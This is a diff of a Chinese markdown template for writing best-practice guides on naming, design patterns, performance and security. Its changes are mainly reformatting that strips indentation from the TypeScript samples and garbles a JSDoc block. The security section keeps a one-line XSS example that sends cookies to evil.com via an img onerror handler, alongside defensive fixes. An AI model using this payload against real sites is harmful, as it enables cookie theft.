@@ -13,10 +13,10 @@ description: 用于生成最佳实践指南的标准模板,定义代码规范、
 
 ```yaml
 ---
-title: [主题领域] 最佳实践
-description: [完整的实践目标和适用场景说明]
+title: '[主题领域] 最佳实践'
+description: '[完整的实践目标和适用场景说明]'
 category: 实践
-ai_model: Gemini  # 推荐使用 Gemini 进行模式识别
+ai_model: Gemini # 推荐使用 Gemini 进行模式识别
 ---
 ```
 
@@ -27,6 +27,7 @@ ai_model: Gemini  # 推荐使用 Gemini 进行模式识别
 **目的**: 定义代码风格、命名约定和格式化标准。
 
 **内容要求**:
+
 - **命名规范**: 变量、函数、类、文件的命名约定
 - **代码格式**: 缩进、空行、行宽等格式要求
 - **注释规范**: 何时写注释、注释风格
@@ -34,6 +35,7 @@ ai_model: Gemini  # 推荐使用 Gemini 进行模式识别
 - **对比示例**: 好的实践 vs 不好的实践
 
 **示例结构**:
+
 ```markdown
 ## 代码规范
 
@@ -52,9 +54,9 @@ function getUserById(id: string): User | null { }
 **❌ 不推荐做法**:
 \`\`\`typescript
 // 命名不清晰,难以理解功能
-function calc(items: any[]): any { }  // 太简略
-function doValidation(x: string): boolean { }  // 泛化动词
-function user(id: string) { }  // 缺少动词
+function calc(items: any[]): any { } // 太简略
+function doValidation(x: string): boolean { } // 泛化动词
+function user(id: string) { } // 缺少动词
 \`\`\`
 
 **原因**: 清晰的命名减少代码阅读成本,动词开头明确表达行为意图。
@@ -62,6 +64,7 @@ function user(id: string) { }  // 缺少动词
 #### 变量命名
 
 **规则**:
+
 - 使用有意义的名称,避免单字母变量 (循环索引除外)
 - 布尔值使用 `is/has/should` 前缀
 - 常量使用 `UPPER_SNAKE_CASE`
@@ -75,14 +78,15 @@ const hasPermission = checkPermission(user)
 const MAX_RETRY_COUNT = 3
 
 // ❌ 不推荐
-const ua = true  // 含义不明
-const perm = checkPermission(user)  // 过度缩写
-const maxRetry = 3  // 常量应大写
+const ua = true // 含义不明
+const perm = checkPermission(user) // 过度缩写
+const maxRetry = 3 // 常量应大写
 \`\`\`
 
 ### 代码格式
 
 **基础规则**:
+
 - **缩进**: 使用 2 空格 (TypeScript/JavaScript)
 - **行宽**: 不超过 100 字符
 - **分号**: 始终使用分号
@@ -92,22 +96,23 @@ const maxRetry = 3  // 常量应大写
 \`\`\`typescript
 // ✅ 推荐格式
 function processData(
-  input: string,
-  options: ProcessOptions
+input: string,
+options: ProcessOptions
 ): Result {
-  const { maxLength, allowEmpty } = options;
+const { maxLength, allowEmpty } = options;
 
-  if (!allowEmpty && input.length === 0) {
-    throw new Error('Input cannot be empty');
-  }
+if (!allowEmpty && input.length === 0) {
+throw new Error('Input cannot be empty');
+}
 
-  return { processed: input.slice(0, maxLength) };
+return { processed: input.slice(0, maxLength) };
 }
 \`\`\`
 
 ### 注释规范
 
 **何时写注释**:
+
 - ✅ 复杂算法的实现思路
 - ✅ 非显而易见的业务逻辑
 - ✅ 重要的性能优化说明
@@ -115,23 +120,24 @@ function processData(
 
 **JSDoc 注释**:
 \`\`\`typescript
-/**
- * 计算数组中所有数字的总和
- *
- * @param numbers - 待求和的数字数组
- * @returns 数组所有元素的总和
- * @throws 当数组包含非数字元素时抛出错误
- *
- * @example
- * \`\`\`typescript
- * sum([1, 2, 3])  // => 6
- * sum([])  // => 0
- * \`\`\`
- */
-function sum(numbers: number[]): number {
+/\*\*
+
+- 计算数组中所有数字的总和
+-
+- @param numbers - 待求和的数字数组
+- @returns 数组所有元素的总和
+- @throws 当数组包含非数字元素时抛出错误
+-
+- @example
+- \`\`\`typescript
+- sum([1, 2, 3]) // => 6
+- sum([]) // => 0
+- \`\`\`
+  \*/
+  function sum(numbers: number[]): number {
   return numbers.reduce((acc, n) => acc + n, 0);
-}
-\`\`\`
+  }
+  \`\`\`
 ```
 
 #### 2. 设计模式
@@ -139,12 +145,14 @@ function sum(numbers: number[]): number {
 **目的**: 总结常用设计模式和反模式,提供可复用的解决方案。
 
 **内容要求**:
+
 - **常用模式**: 项目中广泛应用的设计模式
 - **模式应用**: 何时使用、如何实现
 - **反模式识别**: 常见的错误设计及其危害
 - **重构建议**: 如何改进不良设计
 
 **示例结构**:
+
 ```markdown
 ## 设计模式
 
@@ -162,18 +170,18 @@ function sum(numbers: number[]): number {
 
 \`\`\`typescript
 class Animal {
-  move() { console.log('Moving'); }
+move() { console.log('Moving'); }
 }
 
 class Bird extends Animal {
-  fly() { console.log('Flying'); }
+fly() { console.log('Flying'); }
 }
 
 class Penguin extends Bird {
-  // 企鹅不会飞,但继承了 fly 方法
-  fly() {
-    throw new Error('Penguins cannot fly');
-  }
+// 企鹅不会飞,但继承了 fly 方法
+fly() {
+throw new Error('Penguins cannot fly');
+}
 }
 \`\`\`
 
@@ -183,48 +191,50 @@ class Penguin extends Bird {
 
 \`\`\`typescript
 interface Movable {
-  move(): void;
+move(): void;
 }
 
 interface Flyable {
-  fly(): void;
+fly(): void;
 }
 
 class WalkMovement implements Movable {
-  move() { console.log('Walking'); }
+move() { console.log('Walking'); }
 }
 
 class FlyMovement implements Flyable {
-  fly() { console.log('Flying'); }
+fly() { console.log('Flying'); }
 }
 
 class Bird {
-  constructor(
-    private movement: Movable,
-    private flyBehavior?: Flyable
-  ) {}
+constructor(
+private movement: Movable,
+private flyBehavior?: Flyable
+) {}
 
-  move() { this.movement.move(); }
-  fly() {
-    if (this.flyBehavior) {
-      this.flyBehavior.fly();
-    } else {
-      console.log('Cannot fly');
-    }
-  }
+move() { this.movement.move(); }
+fly() {
+if (this.flyBehavior) {
+this.flyBehavior.fly();
+} else {
+console.log('Cannot fly');
+}
+}
 }
 
 // 灵活组合
 const sparrow = new Bird(new WalkMovement(), new FlyMovement());
-const penguin = new Bird(new WalkMovement());  // 没有飞行能力
+const penguin = new Bird(new WalkMovement()); // 没有飞行能力
 \`\`\`
 
 **优势**:
+
 - 松耦合,易于扩展和修改
 - 符合单一职责原则
 - 行为可在运行时动态组合
 
 **适用场景**:
+
 - 功能组合多样,不适合继承层次
 - 需要运行时切换行为
 - 避免类爆炸问题
@@ -236,31 +246,31 @@ const penguin = new Bird(new WalkMovement());  // 没有飞行能力
 **实现**:
 \`\`\`typescript
 interface Logger {
-  log(message: string): void;
+log(message: string): void;
 }
 
 class ConsoleLogger implements Logger {
-  log(message: string) { console.log(message); }
+log(message: string) { console.log(message); }
 }
 
 class FileLogger implements Logger {
-  constructor(private filePath: string) {}
-  log(message: string) {
-    // 写入文件逻辑
-  }
+constructor(private filePath: string) {}
+log(message: string) {
+// 写入文件逻辑
+}
 }
 
 // 工厂函数
 function createLogger(type: 'console' | 'file', options?: { filePath?: string }): Logger {
-  switch (type) {
-    case 'console':
-      return new ConsoleLogger();
-    case 'file':
-      if (!options?.filePath) {
-        throw new Error('File path required for FileLogger');
-      }
-      return new FileLogger(options.filePath);
-  }
+switch (type) {
+case 'console':
+return new ConsoleLogger();
+case 'file':
+if (!options?.filePath) {
+throw new Error('File path required for FileLogger');
+}
+return new FileLogger(options.filePath);
+}
 }
 
 // 使用
@@ -279,21 +289,21 @@ logger.log('Application started');
 \`\`\`typescript
 // ❌ 反模式
 class Application {
-  // 数据库操作
-  connectDatabase() { }
-  queryData() { }
+// 数据库操作
+connectDatabase() { }
+queryData() { }
 
-  // UI 渲染
-  renderUI() { }
-  handleClick() { }
+// UI 渲染
+renderUI() { }
+handleClick() { }
 
-  // 业务逻辑
-  processOrder() { }
-  validateUser() { }
+// 业务逻辑
+processOrder() { }
+validateUser() { }
 
-  // 日志和配置
-  logMessage() { }
-  loadConfig() { }
+// 日志和配置
+logMessage() { }
+loadConfig() { }
 }
 \`\`\`
 
@@ -307,12 +317,14 @@ class Application {
 **目的**: 识别性能瓶颈并提供优化策略。
 
 **内容要求**:
+
 - **瓶颈识别**: 常见的性能问题类型
 - **优化策略**: 具体的优化方法和技巧
 - **测量方法**: 如何验证优化效果
 - **权衡考虑**: 优化的成本和收益
 
 **示例结构**:
+
 ```markdown
 ## 性能优化
 
@@ -324,19 +336,20 @@ class Application {
 
 \`\`\`typescript
 function processItems(items: Item[]) {
-  const results: Result[] = [];
+const results: Result[] = [];
 
-  for (let i = 0; i < items.length; i++) {
-    // 每次循环都重复计算 items.length
-    const progress = (i + 1) / items.length * 100;
+for (let i = 0; i < items.length; i++) {
+// 每次循环都重复计算 items.length
+const progress = (i + 1) / items.length \* 100;
 
     // 每次循环都创建新的正则表达式
     if (/^[A-Z]/.test(items[i].name)) {
       results.push(processItem(items[i]));
     }
-  }
 
-  return results;
+}
+
+return results;
 }
 \`\`\`
 
@@ -344,23 +357,25 @@ function processItems(items: Item[]) {
 
 \`\`\`typescript
 function processItems(items: Item[]) {
-  const results: Result[] = [];
-  const totalItems = items.length;  // 缓存长度
-  const namePattern = /^[A-Z]/;  // 复用正则对象
+const results: Result[] = [];
+const totalItems = items.length; // 缓存长度
+const namePattern = /^[A-Z]/; // 复用正则对象
 
-  for (let i = 0; i < totalItems; i++) {
-    const progress = (i + 1) / totalItems * 100;
+for (let i = 0; i < totalItems; i++) {
+const progress = (i + 1) / totalItems \* 100;
 
     if (namePattern.test(items[i].name)) {
       results.push(processItem(items[i]));
     }
-  }
 
-  return results;
+}
+
+return results;
 }
 \`\`\`
 
 **优化说明**:
+
 - 缓存 `items.length` 避免每次访问数组属性
 - 复用正则表达式对象,避免重复编译
 - 性能提升: 约 10-20% (取决于数组大小)
@@ -375,29 +390,30 @@ function processItems(items: Item[]) {
 
 \`\`\`typescript
 function debounce<T extends (...args: any[]) => any>(
-  fn: T,
-  delay: number
+fn: T,
+delay: number
 ): (...args: Parameters<T>) => void {
-  let timeoutId: ReturnType<typeof setTimeout> | null = null;
+let timeoutId: ReturnType<typeof setTimeout> | null = null;
 
-  return function (...args: Parameters<T>) {
-    if (timeoutId) clearTimeout(timeoutId);
+return function (...args: Parameters<T>) {
+if (timeoutId) clearTimeout(timeoutId);
 
     timeoutId = setTimeout(() => {
       fn(...args);
     }, delay);
-  };
+
+};
 }
 
 // 使用示例
 const searchInput = document.getElementById('search');
 const debouncedSearch = debounce((query: string) => {
-  // 发起搜索请求
-  fetch(\`/api/search?q=\${query}\`);
+// 发起搜索请求
+fetch(\`/api/search?q=\${query}\`);
 }, 300);
 
 searchInput?.addEventListener('input', (e) => {
-  debouncedSearch((e.target as HTMLInputElement).value);
+debouncedSearch((e.target as HTMLInputElement).value);
 });
 \`\`\`
 
@@ -409,24 +425,25 @@ searchInput?.addEventListener('input', (e) => {
 
 \`\`\`typescript
 function throttle<T extends (...args: any[]) => any>(
-  fn: T,
-  interval: number
+fn: T,
+interval: number
 ): (...args: Parameters<T>) => void {
-  let lastTime = 0;
+let lastTime = 0;
 
-  return function (...args: Parameters<T>) {
-    const now = Date.now();
+return function (...args: Parameters<T>) {
+const now = Date.now();
 
     if (now - lastTime >= interval) {
       fn(...args);
       lastTime = now;
     }
-  };
+
+};
 }
 
 // 使用示例
 const throttledScroll = throttle(() => {
-  console.log('Scroll position:', window.scrollY);
+console.log('Scroll position:', window.scrollY);
 }, 200);
 
 window.addEventListener('scroll', throttledScroll);
@@ -439,24 +456,25 @@ window.addEventListener('scroll', throttledScroll);
 **使用 Performance API**:
 \`\`\`typescript
 function measurePerformance<T>(
-  name: string,
-  fn: () => T
+name: string,
+fn: () => T
 ): T {
-  const start = performance.now();
-  const result = fn();
-  const end = performance.now();
+const start = performance.now();
+const result = fn();
+const end = performance.now();
 
-  console.log(\`\${name} took \${(end - start).toFixed(2)}ms\`);
-  return result;
+console.log(\`\${name} took \${(end - start).toFixed(2)}ms\`);
+return result;
 }
 
 // 使用
 const processedData = measurePerformance('Data Processing', () => {
-  return processLargeDataset(data);
+return processLargeDataset(data);
 });
 \`\`\`
 
 **性能优化权衡**:
+
 - ✅ 优化前先测量,避免过早优化
 - ⚠️ 考虑代码可读性 vs 性能提升的平衡
 - ⚠️ 优化应针对瓶颈,不是所有代码都需要优化
@@ -467,12 +485,14 @@ const processedData = measurePerformance('Data Processing', () => {
 **目的**: 识别常见安全漏洞并提供防护措施。
 
 **内容要求**:
+
 - **常见漏洞**: 项目中可能出现的安全问题
 - **防护措施**: 具体的安全实践方法
 - **验证方法**: 如何检测安全漏洞
 - **安全清单**: 开发和部署的安全检查项
 
 **示例结构**:
+
 ```markdown
 ## 安全实践
 
@@ -487,7 +507,7 @@ const processedData = measurePerformance('Data Processing', () => {
 \`\`\`typescript
 // 直接插入用户输入,存在 XSS 风险
 function displayUserComment(comment: string) {
-  document.getElementById('comments')!.innerHTML = comment;
+document.getElementById('comments')!.innerHTML = comment;
 }
 
 // 攻击示例
@@ -501,25 +521,25 @@ displayUserComment('<img src=x onerror="fetch(\\'https://evil.com?cookie=\\' + d
 **方案 1: 使用 textContent**
 \`\`\`typescript
 function displayUserComment(comment: string) {
-  const element = document.getElementById('comments')!;
-  element.textContent = comment;  // 自动转义,防止脚本执行
+const element = document.getElementById('comments')!;
+element.textContent = comment; // 自动转义,防止脚本执行
 }
 \`\`\`
 
 **方案 2: HTML 转义**
 \`\`\`typescript
 function escapeHtml(unsafe: string): string {
-  return unsafe
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#039;');
+return unsafe
+.replace(/&/g, '&amp;')
+.replace(/</g, '&lt;')
+.replace(/>/g, '&gt;')
+.replace(/"/g, '&quot;')
+.replace(/'/g, '&#039;');
 }
 
 function displayUserComment(comment: string) {
-  const escaped = escapeHtml(comment);
-  document.getElementById('comments')!.innerHTML = escaped;
+const escaped = escapeHtml(comment);
+document.getElementById('comments')!.innerHTML = escaped;
 }
 \`\`\`
 
@@ -528,8 +548,8 @@ function displayUserComment(comment: string) {
 import DOMPurify from 'dompurify';
 
 function displayUserComment(comment: string) {
-  const clean = DOMPurify.sanitize(comment);
-  document.getElementById('comments')!.innerHTML = clean;
+const clean = DOMPurify.sanitize(comment);
+document.getElementById('comments')!.innerHTML = clean;
 }
 \`\`\`
 
@@ -543,55 +563,56 @@ function displayUserComment(comment: string) {
 
 \`\`\`typescript
 interface UserInput {
-  email: string;
-  age: number;
-  website?: string;
+email: string;
+age: number;
+website?: string;
 }
 
 function validateUserInput(input: unknown): UserInput {
-  if (typeof input !== 'object' || input === null) {
-    throw new Error('Invalid input: must be an object');
-  }
+if (typeof input !== 'object' || input === null) {
+throw new Error('Invalid input: must be an object');
+}
 
-  const data = input as Record<string, unknown>;
+const data = input as Record<string, unknown>;
 
-  // 验证 email
-  if (typeof data.email !== 'string' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
-    throw new Error('Invalid email format');
-  }
+// 验证 email
+if (typeof data.email !== 'string' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
+throw new Error('Invalid email format');
+}
 
-  // 验证 age
-  if (typeof data.age !== 'number' || data.age < 0 || data.age > 150) {
-    throw new Error('Invalid age: must be between 0 and 150');
-  }
+// 验证 age
+if (typeof data.age !== 'number' || data.age < 0 || data.age > 150) {
+throw new Error('Invalid age: must be between 0 and 150');
+}
 
-  // 验证可选字段
-  if (data.website !== undefined) {
-    if (typeof data.website !== 'string' || !isValidUrl(data.website)) {
-      throw new Error('Invalid website URL');
-    }
-  }
+// 验证可选字段
+if (data.website !== undefined) {
+if (typeof data.website !== 'string' || !isValidUrl(data.website)) {
+throw new Error('Invalid website URL');
+}
+}
 
-  return {
-    email: data.email,
-    age: data.age,
-    website: data.website as string | undefined
-  };
+return {
+email: data.email,
+age: data.age,
+website: data.website as string | undefined
+};
 }
 
 function isValidUrl(url: string): boolean {
-  try {
-    new URL(url);
-    return true;
-  } catch {
-    return false;
-  }
+try {
+new URL(url);
+return true;
+} catch {
+return false;
+}
 }
 \`\`\`
 
 ### 敏感数据处理
 
 **规则**:
+
 1. ❌ 永远不要在客户端存储密码、令牌等敏感数据
 2. ✅ 使用 HTTPS 传输敏感信息
 3. ✅ 对敏感数据加密存储
@@ -602,36 +623,37 @@ function isValidUrl(url: string): boolean {
 \`\`\`typescript
 // ❌ 不安全: 明文传输
 async function loginUser(username: string, password: string) {
-  const response = await fetch('http://api.example.com/login', {
-    method: 'POST',
-    body: JSON.stringify({ username, password })  // 明文
-  });
+const response = await fetch('http://api.example.com/login', {
+method: 'POST',
+body: JSON.stringify({ username, password }) // 明文
+});
 }
 
 // ✅ 安全: HTTPS + 服务端哈希
 async function loginUser(username: string, password: string) {
-  const response = await fetch('https://api.example.com/login', {  // HTTPS
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username, password })
-  });
+const response = await fetch('https://api.example.com/login', { // HTTPS
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ username, password })
+});
 
-  // 服务端应使用 bcrypt/argon2 哈希密码
+// 服务端应使用 bcrypt/argon2 哈希密码
 }
 
 // 令牌存储
 function storeAuthToken(token: string) {
-  // ❌ 不安全: localStorage (易受 XSS 攻击)
-  // localStorage.setItem('token', token);
+// ❌ 不安全: localStorage (易受 XSS 攻击)
+// localStorage.setItem('token', token);
 
-  // ✅ 更安全: HttpOnly Cookie (由服务端设置)
-  // 客户端无法通过 JS 访问,防止 XSS 窃取
+// ✅ 更安全: HttpOnly Cookie (由服务端设置)
+// 客户端无法通过 JS 访问,防止 XSS 窃取
 }
 \`\`\`
 
 ### 安全检查清单
 
 **开发阶段**:
+
 - [ ] 所有用户输入都经过验证和清理
 - [ ] 使用参数化查询防止 SQL 注入
 - [ ] HTML 内容使用转义或 DOMPurify
@@ -639,6 +661,7 @@ function storeAuthToken(token: string) {
 - [ ] 不在代码中硬编码密钥和令牌
 
 **部署阶段**:
+
 - [ ] 启用 HTTPS
 - [ ] 设置安全响应头 (CSP, X-Frame-Options)
 - [ ] 限制 API 访问频率 (Rate Limiting)
